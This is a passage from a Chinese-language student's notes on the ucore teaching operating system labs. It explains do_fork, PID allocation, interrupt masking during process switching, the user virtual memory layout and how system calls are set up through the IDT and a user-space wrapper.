*tf</code>成员变量含义和在本实验中的作用是啥？</p><ul><li>context的含义很简单, 就是该线程的上下文即必要的控制流信息, 作用是在proc_run()函数中调用的switch(汇编label)保存当前执行的线程, 然后恢复next线程的context</li><li>tf一开始在kern_thread中作为局部变量存在栈上, 设置好从中断返回(通过iret)时的控制流后调用do_fork(), 在do_fork中的copy_thread复制tf到新线程, 至此完成任务</li></ul><h3 id="练习2-1"><a href="#练习2-1" class="headerlink" title="练习2"></a>练习2</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* do_fork -     parent process for a new child process</span><br><span class="hljs-comment"> * @clone_flags: used to guide how to clone the child process</span><br><span class="hljs-comment"> * @stack:       the parent&#x27;s user stack pointer. if stack==0, It means to fork a kernel thread.</span><br><span class="hljs-comment"> * @tf:          the trapframe info, which will be copied to child process&#x27;s proc-&gt;tf</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">do_fork</span><span class="hljs-params">(<span class="hljs-keyword">uint32_t</span> clone_flags, <span class="hljs-keyword">uintptr_t</span> <span class="hljs-built_in">stack</span>, struct trapframe *tf)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> ret = -E_NO_FREE_PROC;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *<span class="hljs-title">proc</span>;</span><br>    <span class="hljs-keyword">if</span> (nr_process &gt;= MAX_PROCESS)<br>    &#123;<br>        <span class="hljs-keyword">goto</span> fork_out;<br>    &#125;<br>    ret = -E_NO_MEM;<br>    <span class="hljs-comment">//    1. call alloc_proc to allocate a proc_struct</span><br>    <span class="hljs-comment">//    2. call setup_kstack to allocate a kernel stack for child process</span><br>    <span class="hljs-comment">//    3. call copy_mm to dup OR share mm according clone_flag</span><br>    <span class="hljs-comment">//    4. call copy_thread to setup tf &amp; context in proc_struct</span><br>    <span class="hljs-comment">//    5. insert proc_struct into hash_list &amp;&amp; proc_list</span><br>    <span class="hljs-comment">//    6. call wakeup_proc to make the new child process RUNNABLE</span><br>    <span class="hljs-comment">//    7. set ret vaule using child proc&#x27;s pid</span><br>    <span class="hljs-keyword">if</span> ((proc = alloc_proc()) == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        cprintf(<span class="hljs-string">&quot;alloc_proc() failed!&quot;</span>);<br>        <span class="hljs-keyword">goto</span> fork_out;<br>    &#125;<br>    proc-&gt;parent = current;<br>    <span class="hljs-keyword">if</span> ((ret = setup_kstack(proc)) != <span class="hljs-number">0</span>)<br>    &#123; <span class="hljs-comment">//call the alloc_pages to alloc kstack space</span><br>        cprintf(<span class="hljs-string">&quot;set_kstack() failed!&quot;</span>);<br>        <span class="hljs-keyword">goto</span> bad_fork_cleanup_proc;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (copy_mm(clone_flags, proc) != <span class="hljs-number">0</span>)<br>    &#123;<br>cprintf(<span class="hljs-string">&quot;copy_mm() failed!&quot;</span>);<br>        <span class="hljs-keyword">goto</span> bad_fork_cleanup_kstack;<br>    &#125;<br>    copy_thread(proc, <span class="hljs-built_in">stack</span>, tf);<br>    <span class="hljs-keyword">bool</span> intr_flag;<br>    local_intr_save(intr_flag);<br>    &#123;<span class="hljs-comment">//原来这里还要加上屏蔽中断, 应该是操作当前proc_struct需要一起完成</span><br>     <span class="hljs-comment">//防止某个中断服务例程用到的时候出现错误</span><br>        proc-&gt;pid = get_pid();<br>        hash_proc(proc);<br>        list_add(&amp;proc_list, &amp;(proc-&gt;list_link));<br>        nr_process++;<br>    &#125;<br>    local_intr_restore(intr_flag);<br>    wakeup_proc(proc);<br>    ret = proc-&gt;pid;<br>fork_out:<br>    <span class="hljs-keyword">return</span> ret;<br><br>bad_fork_cleanup_kstack:<br>    put_kstack(proc);<br>bad_fork_cleanup_proc:<br>    kfree(proc);<br>    <span class="hljs-keyword">goto</span> fork_out;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>请说明ucore是否做到给每个新fork的线程一个唯一的id？请说明你的分析和理由。</p><p>uCore中，每个新fork的线程都存在唯一的一个ID，理由如下：</p><ul><li><p>这一段代码相当于找出了一个初始为(MAX_PID,MAX_PID), 不满足条件时往pid大的方向查找空闲区间(last_safe, next_safe),<br>只要<code>++last&lt;next</code>则自增后的last即为可分配的pid, 具体流程写进代码注释中</p></li><li><p>所以说就是通过维护一个可用PID的区间, 可以提高分配pid的效率</p></li><li><p><code>get_pid</code>代码如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// get_pid - alloc a unique pid for process</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">get_pid</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">static_assert</span>(MAX_PID &gt; MAX_PROCESS);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *<span class="hljs-title">proc</span>;</span><br>    <span class="hljs-keyword">list_entry_t</span> *<span class="hljs-built_in">list</span> = &amp;proc_list, *le;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> next_safe = MAX_PID, last_pid = MAX_PID;<br>    <span class="hljs-keyword">if</span> (++last_pid &gt;= MAX_PID)<br>    &#123;<span class="hljs-comment">//last自增后&gt;=MAX_PID, 从1重新开始, next设为MAX_PID, 待后续缩小范围</span><br>        last_pid = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">goto</span> inside;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (last_pid &gt;= next_safe)<br>    &#123;<span class="hljs-comment">//last自增后&gt;=next, 当前空闲区间**已用完**, 继续向后查找</span><br>    inside:<br>        next_safe = MAX_PID;<br>    repeat:<span class="hljs-comment">//这段代码看半天, 终于看出来是在遍历proc_list, 如果pid==last, last就++</span><br>        <span class="hljs-comment">//如果pid在last和next之间, 则next=pid以缩小范围.</span><br>        <span class="hljs-comment">//特殊情况: ++last&gt;next,则重启while循环, 并且if(++last&gt;MAX_PID)则重置last为1</span><br>        le = <span class="hljs-built_in">list</span>;<br>        <span class="hljs-keyword">while</span> ((le = list_next(le)) != <span class="hljs-built_in">list</span>)<br>        &#123;<br>            proc = le2proc(le, list_link);<br>            <span class="hljs-keyword">if</span> (proc-&gt;pid == last_pid)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (++last_pid &gt;= next_safe)<br>                &#123;<br>                    <span class="hljs-keyword">if</span> (last_pid &gt;= MAX_PID)<br>                    &#123;<br>                        last_pid = <span class="hljs-number">1</span>;<br>                    &#125;<br>                    next_safe = MAX_PID;<br>                    <span class="hljs-keyword">goto</span> repeat;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (proc-&gt;pid &gt; last_pid &amp;&amp; next_safe &gt; proc-&gt;pid)<br>            &#123;<br>                next_safe = proc-&gt;pid;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> last_pid;<br>&#125;<br></code></pre></div></td></tr></table></figure></li></ul><h3 id="练习3"><a href="#练习3" class="headerlink" title="练习3"></a>练习3</h3><blockquote><p>理解proc_run</p></blockquote><p><strong>两个问题:</strong> </p><ul><li>在本实验的执行过程中，创建且运行了几个内核线程？<ul><li>两个</li></ul></li><li>语句<code>local_intr_save(intr_flag);....local_intr_restore(intr_flag);</code>在这里有何作用?请说明理由<ul><li>屏蔽中断</li><li>这两句的配合，使得这两句代码之间的代码块形成<strong>原子操作</strong>，可以使得某些关键的代码不会被打断，从而避免引起一些未预料到的错误，避免条件竞争。</li><li>以进程切换为例，在<code>proc_run</code>中，当刚设置好<code>current</code>指针为下一个进程，但还未完全将控制权转移时，如果该过程突然被一个中断所打断，则中断处理例程的执行可能会引发异常，因为<code>current</code>指针指向的进程与实际使用的进程资源不一致。</li></ul></li></ul><p>challenge</p><blockquote><p>鸽!</p></blockquote><h1 id="Lab5"><a href="#Lab5" class="headerlink" title="Lab5"></a>Lab5</h1><h2 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h2><h3 id="0-项目结构"><a href="#0-项目结构" class="headerlink" title="0.项目结构"></a>0.项目结构</h3><p>相对与实验四，实验五主要改动如下：</p><p>◆ kern/debug/</p><p>kdebug.c：修改：解析用户进程的符号信息表示（可不用理会）</p><p>◆ kern/mm/ （与本次实验有较大关系）</p><p>memlayout.h：修改：增加了用户虚存地址空间的图形表示和宏定义 （需仔细理解）。</p><p>pmm.[ch]：修改：添加了用于进程退出（do_exit）的内存资源回收的page_remove_pte、unmap_range、exit_range函数和用于创建子进程（do_fork）中拷贝父进程内存空间的copy_range函数，修改了pgdir_alloc_page函数</p><p>vmm.[ch]：修改：扩展了mm_struct数据结构，增加了一系列函数</p><ul><li>mm_map/dup_mmap/exit_mmap：设定/取消/复制/删除用户进程的合法内存空间</li><li>copy_from_user/copy_to_user：用户内存空间内容与内核内存空间内容的相互拷贝的实现</li><li>user_mem_check：搜索vma链表，检查是否是一个合法的用户空间范围</li></ul><p>◆ kern/process/ （与本次实验有较大关系）</p><p>proc.[ch]：修改：扩展了proc_struct数据结构。增加或修改了一系列函数</p><ul><li>setup_pgdir/put_pgdir：创建并设置/释放页目录表</li><li>copy_mm：复制用户进程的内存空间和设置相关内存管理（如页表等）信息</li><li>do_exit：释放进程自身所占内存空间和相关内存管理（如页表等）信息所占空间，唤醒父进程，好让父进程收了自己，让调度器切换到其他进程</li><li>load_icode：被do_execve调用，完成加载放在内存中的执行程序到进程空间，这涉及到对页表等的修改，分配用户栈</li><li>do_execve：先回收自身所占用户空间，然后调用load_icode，用新的程序覆盖内存空间，形成一个执行新程序的新进程</li><li>do_yield：让调度器执行一次选择新进程的过程</li><li>do_wait：父进程等待子进程，并在得到子进程的退出消息后，彻底回收子进程所占的资源（比如子进程的内核栈和进程控制块）</li><li>do_kill：给一个进程设置PF_EXITING标志（“kill”信息，即要它死掉），这样在trap函数中，将根据此标志，让进程退出</li><li>KERNEL_EXECVE/__KERNEL_EXECVE/__KERNEL_EXECVE2：被user_main调用，执行一用户进程</li></ul><p>◆ kern/trap/</p><p>trap.c：修改：在idt_init函数中，对IDT初始化时，设置好了用于系统调用的中断门（idt[T_SYSCALL]）信息。这主要与syscall的实现相关</p><p>◆ user/*</p><p>新增的用户程序和用户库</p><h3 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h3><ul><li>kern_init()-&gt;proc_init()-&gt;initproc-&gt;init_main()-&gt;kern_thread()-&gt;kernel_execve()</li><li>下图是虚拟内存的分布图, 注意page table固定在0xFAC00000的位置, 又给忘记了导致想了一会儿,<br>对于每个进程来说所看到的内存空间都是这样的.</li></ul> <figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* *</span><br><span class="hljs-comment"> * Virtual memory map:                                          Permissions</span><br><span class="hljs-comment"> *                                                              kernel/user</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *     4G ------------------&gt; +---------------------------------+</span><br><span class="hljs-comment"> *                            |                                 |</span><br><span class="hljs-comment"> *                            |         Empty Memory (*)        |</span><br><span class="hljs-comment"> *                            |                                 |</span><br><span class="hljs-comment"> *                            +---------------------------------+ 0xFB000000</span><br><span class="hljs-comment"> *                            |   Cur. Page Table (Kern, RW)    | RW/-- PTSIZE</span><br><span class="hljs-comment"> *     VPT -----------------&gt; +---------------------------------+ 0xFAC00000</span><br><span class="hljs-comment"> *                            |        Invalid Memory (*)       | --/--</span><br><span class="hljs-comment"> *     KERNTOP -------------&gt; +---------------------------------+ 0xF8000000</span><br><span class="hljs-comment"> *                            |                                 |</span><br><span class="hljs-comment"> *                            |    Remapped Physical Memory     | RW/-- KMEMSIZE</span><br><span class="hljs-comment"> *                            |                                 |</span><br><span class="hljs-comment"> *     KERNBASE ------------&gt; +---------------------------------+ 0xC0000000</span><br><span class="hljs-comment"> *                            |        Invalid Memory (*)       | --/--</span><br><span class="hljs-comment"> *     USERTOP -------------&gt; +---------------------------------+ 0xB0000000</span><br><span class="hljs-comment"> *                            |           User stack            |</span><br><span class="hljs-comment"> *                            +---------------------------------+</span><br><span class="hljs-comment"> *                            |                                 |</span><br><span class="hljs-comment"> *                            :                                 :</span><br><span class="hljs-comment"> *                            |         ~~~~~~~~~~~~~~~~        |</span><br><span class="hljs-comment"> *                            :                                 :</span><br><span class="hljs-comment"> *                            |                                 |</span><br><span class="hljs-comment"> *                            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="hljs-comment"> *                            |       User Program &amp; Heap       |</span><br><span class="hljs-comment"> *     UTEXT ---------------&gt; +---------------------------------+ 0x00800000</span><br><span class="hljs-comment"> *                            |        Invalid Memory (*)       | --/--</span><br><span class="hljs-comment"> *                            |  - - - - - - - - - - - - - - -  |</span><br><span class="hljs-comment"> *                            |    User STAB Data (optional)    |</span><br><span class="hljs-comment"> *     USERBASE, USTAB------&gt; +---------------------------------+ 0x00200000</span><br><span class="hljs-comment"> *                            |        Invalid Memory (*)       | --/--</span><br><span class="hljs-comment"> *     0 -------------------&gt; +---------------------------------+ 0x00000000</span><br><span class="hljs-comment"> * (*) Note: The kernel ensures that &quot;Invalid Memory&quot; is *never* mapped.</span><br><span class="hljs-comment"> *     &quot;Empty Memory&quot; is normally unmapped, but user programs may map pages</span><br><span class="hljs-comment"> *     there if desired.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * */</span><br></code></pre></div></td></tr></table></figure><h3 id="2-创建用户进程"><a href="#2-创建用户进程" class="headerlink" title="2.创建用户进程"></a>2.创建用户进程</h3><h4 id="a-应用程序的组成和编译"><a href="#a-应用程序的组成和编译" class="headerlink" title="a. 应用程序的组成和编译"></a>a. 应用程序的组成和编译</h4><p>从实验提供的用户程序编译入手, 可以看出hello应用程序不仅仅是hello.c，还包含了支持hello应用程序的用户态库：</p><ul><li>user/libs/initcode.S：所有应用程序的起始用户态执行地址“_start”，调整了EBP和ESP后，调用umain函数。</li><li>user/libs/umain.c：实现了umain函数，这是所有应用程序执行的第一个C函数，它将调用应用程序的main函数，并在main函数结束后调用exit函数，而exit函数最终将调用sys_exit系统调用，让操作系统回收进程资源。</li><li>user/libs/ulib.[ch]：实现了最小的C函数库，除了一些与系统调用无关的函数，其他函数是对访问系统调用的包装。</li><li>user/libs/syscall.[ch]：用户层发出系统调用的具体实现。</li><li>user/libs/stdio.c：实现cprintf函数，通过系统调用sys_putc来完成字符输出。</li><li>user/libs/panic.c：实现__panic/__warn函数，通过系统调用sys_exit完成用户进程退出。</li></ul><p>除了这些用户态库函数实现外，还有一些libs/*.[ch]是操作系统内核和应用程序共用的函数实现。<strong>这些用户库函数其实在本质上与UNIX系统中的标准libc没有区别</strong>，只是实现得很简单，但hello应用程序的正确执行离不开这些库函数。</p><p>在make的最后一步执行了一个ld命令，把hello应用程序的执行码obj/__user_hello.out连接在了ucore kernel的末尾。且ld命令会在kernel中会把__user_hello.out的位置和大小记录在全局变量_binary_obj___user_hello_out_start和_binary_obj___user_hello_out_size中，这样这个hello用户程序就能够和ucore内核一起被 bootloader 加载到内存里中，并且通过这两个全局变量定位hello用户程序执行码的起始位置和大小。而到了与文件系统相关的实验后，ucore会提供一个简单的文件系统，那时所有的用户程序就都不再用这种方法进行加载了，而可以用大家熟悉的文件方式进行加载了。</p><h4 id="b-用户进程的虚拟地址空间"><a href="#b-用户进程的虚拟地址空间" class="headerlink" title="b. 用户进程的虚拟地址空间"></a>b. 用户进程的虚拟地址空间</h4><p>在tools/user.ld描述了用户程序的用户虚拟空间的执行入口虚拟地址：</p><figure class="highlight coq"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs coq">SECTIONS &#123;<br>    /* <span class="hljs-keyword">Load</span> programs <span class="hljs-built_in">at</span> this address: <span class="hljs-string">&quot;.&quot;</span> means the current address */<br>    . = <span class="hljs-number">0x800020</span>;<br></code></pre></div></td></tr></table></figure><p>在tools/kernel.ld描述了操作系统的内核虚拟空间的起始入口虚拟地址：</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts"><span class="hljs-class">SECTIONS </span>&#123;<br>    <span class="hljs-comment">/* Load the kernel at this address: &quot;.&quot; means the current address */</span><br>    . = <span class="hljs-number">0xC0100000</span>;<br></code></pre></div></td></tr></table></figure><p>这样ucore把用户进程的虚拟地址空间分了两块，一块与内核线程一样，是所有用户进程都共享的内核虚拟地址空间，映射到同样的物理内存空间中，这样在物理内存中只需放置一份内核代码，使得用户进程从用户态进入核心态时，内核代码可以统一应对不同的内核程序；另外一块是用户虚拟地址空间，虽然虚拟地址范围一样，但映射到不同且没有交集的物理内存空间中。这样当ucore把用户进程的执行代码（即应用程序的执行代码）和数据（即应用程序的全局变量等）放到用户虚拟地址空间中时，确保了各个进程不会“非法”访问到其他进程的物理内存空间。</p><h4 id="c-创建并执行用户进程"><a href="#c-创建并执行用户进程" class="headerlink" title="c. 创建并执行用户进程"></a>c. 创建并执行用户进程</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">vector128(vectors.S)--\&gt;<br>__alltraps(trapentry.S)--\&gt;trap(trap.c)--\&gt;trap_dispatch(trap.c)--\&gt;syscall(syscall.c)--\&gt;sys_exec(syscall.c）<br>--\&gt;do_execve(proc.c)<br></code></pre></div></td></tr></table></figure><blockquote><p>先清空当前进程的空间, 然后再alloc新的空间</p></blockquote><p>最终通过<strong>do_execve</strong>函数来完成用户进程的创建工作。</p><p><strong>load_icode</strong>函数的主要工作就是给用户进程建立一个能够让用户进程正常运行的用户环境。此函数有一百多行.</p><h3 id="3-系统调用实现"><a href="#3-系统调用实现" class="headerlink" title="3.系统调用实现"></a>3.系统调用实现</h3><p>采用系统调用机制为用户进程提供一个获得操作系统服务的统一接口层，这样一来可简化用户进程的实现，把一些共性的、繁琐的、与硬件相关、与特权指令相关的任务放到操作系统层来实现，但提供一个简洁的接口给用户进程调用；二来这层接口事先可规定好，且严格检查用户进程传递进来的参数和操作系统要返回的数据，使得让操作系统给用户进程服务的同时，保护操作系统不会被用户进程破坏。</p><p>从硬件层面上看，需要硬件能够支持在用户态的用户进程通过某种机制切换到内核态。试验一讲述中断硬件支持和软件处理过程其实就可以用来完成系统调用所需的软硬件支持。下面我们来看看如何在ucore中实现系统调用。</p><h4 id="a-初始化系统调用对应的中断描述符"><a href="#a-初始化系统调用对应的中断描述符" class="headerlink" title="a. 初始化系统调用对应的中断描述符"></a>a. 初始化系统调用对应的中断描述符</h4><p>在ucore初始化函数kern_init中调用了idt_init函数来初始化中断描述符表，并设置一个特定中断号的中断门，专门用于用户进程访问系统调用。此事由ide_init函数完成：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">idt_init</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    <span class="hljs-keyword">extern</span> <span class="hljs-keyword">uintptr_t</span> __vectors[];<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(idt) / <span class="hljs-keyword">sizeof</span>(struct gatedesc); i ++) &#123;<br>        SETGATE(idt[i], <span class="hljs-number">0</span>, GD_KTEXT, __vectors[i], DPL_KERNEL);<br>    &#125;<br>    SETGATE(idt[T_SYSCALL], <span class="hljs-number">1</span>, GD_KTEXT, __vectors[T_SYSCALL], DPL_USER);<br>    lidt(&amp;idt_pd);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>在上述代码中，可以看到在执行加载中断描述符表lidt指令前，专门设置了一个特殊的中断描述符idt[T_SYSCALL]，它的特权级设置为DPL_USER，中断向量处理地址在__vectors[T_SYSCALL]处。这样建立好这个中断描述符后，一旦用户进程执行“INT T_SYSCALL”后，由于此中断允许用户态进程产生（注意它的特权级设置为DPL_USER），所以CPU就会从用户态切换到内核态，保存相关寄存器，并跳转到__vectors[T_SYSCALL]处开始执行，形成如下执行路径：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">vector128(vectors.S)--\&gt;<br>__alltraps(trapentry.S)--\&gt;trap(trap.c)--\&gt;trap_dispatch(trap.c)--\&gt;syscall(syscall.c)<br></code></pre></div></td></tr></table></figure><p>在syscall中，根据系统调用号来完成不同的系统调用服务。</p><h4 id="b-建立系统调用的-用户库-准备"><a href="#b-建立系统调用的-用户库-准备" class="headerlink" title="b. 建立系统调用的**用户库**准备"></a>b. 建立系统调用的**<u>用户库</u>**准备</h4><p>在操作系统中初始化好系统调用相关的中断描述符、中断处理起始地址等后，还需在用户态的应用程序中初始化好相关工作，简化应用程序访问系统调用的复杂性。<strong>为此在用户态建立了一个中间层，即简化的libc实现</strong>，在user/libs/ulib.[ch]和user/libs/syscall.[ch]中完成了对访问系统调用的封装。用户态最终的访问系统调用函数是syscall，实现如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">syscall</span><span class="hljs-params">(<span class="hljs-keyword">int</span> num, ...)</span> </span>&#123;<br>    va_list ap;<br>    va_start(ap, num);<br>    <span class="hljs-keyword">uint32_t</span> a[MAX_ARGS];<br>    <span class="hljs-keyword">int</span> i, ret;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAX_ARGS; i ++) &#123;<br>        a[i] = va_arg(ap, <span class="hljs-keyword">uint32_t</span>);<br>    &#125;<br>    va_end(ap);<br><br>    <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span> <span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-string">&quot;int %1;&quot;</span></span></span><br><span class="hljs-params"><span class="hljs-function">        : <span class="hljs-string">&quot;=a&quot;</span> (ret)</span></span><br><span class="hljs-params"><span class="hljs-function">        : <span class="hljs-string">&quot;i&quot;</span> (T_SYSCALL),</span></span><br><span class="hljs-params"><span class="hljs-function">          <span class="hljs-string">&quot;a&quot;</span> (num),</span></span><br><span class="hljs-params"><span class="hljs-function">          <span class="hljs-string">&quot;d&quot;</span> (a[<span class="hljs-number">0</span>]),</span></span><br><span class="hljs-params"><span class="hljs-function">          <span class="hljs-string">&quot;c&quot;</span> (a[<span class="hljs-number">1</span>]),</span></span><br><span class="hljs-params"><span class="hljs-function">          <span class="hljs-string">&quot;b&quot;</span> (a[<span class="hljs-number">2</span>]),</span></span><br><span class="hljs-params"><span class="hljs-function">          <span class="hljs-string">&quot;D&quot;</span> (a[<span class="hljs-number">3</span>]),</span></span><br><span class="hljs-params"><span class="hljs-function">          <span class="hljs-string">&quot;S&quot;</span> (a[<span class="hljs-number">4</span>])</span></span><br><span class="hljs-params"><span class="hljs-function">        : <span class="hljs-string">&quot;cc&quot;</span>, <span class="hljs-string">&quot;memory&quot;</span>)</span></span>;<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>从中可以看出，应用程序调用的exit/fork/wait/getpid等库函数最终都会调用syscall函数，只是调用的参数不同而已，如果看最终的汇编代码会更清楚：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">……<br>  34:    8b 55 d4               mov    -0x2c(%ebp),%edx<br>  37:    8b 4d d8               mov    -0x28(%ebp),%ecx<br>  3a:    8b 5d dc               mov    -0x24(%ebp),%ebx<br>  3d:    8b 7d e0               mov    -0x20(%ebp),%edi<br>  40:    8b 75 e4               mov    -0x1c(%ebp),%esi<br>  43:    8b 45 08               mov    0x8(%ebp),%eax<br>  46:    cd 80                  int    $0x80<br>  48: 89 45 f0                mov    %eax,-0x10(%ebp)<br>……<br></code></pre></div></td></tr></table></figure><p>可以看到其实是把系统调用号放到EAX，其他5个参数a[0]~a[4]分别保存到EDX/ECX/EBX/EDI/ESI五个寄存器中，及最多用6个寄存器来传递系统调用的参数，且系统调用的返回结果是EAX。比如对于getpid库函数而言，系统调用号（SYS_getpid=18）是保存在EAX中，返回值（调用此库函数的的当前进程号pid）也在EAX中。</p><h4 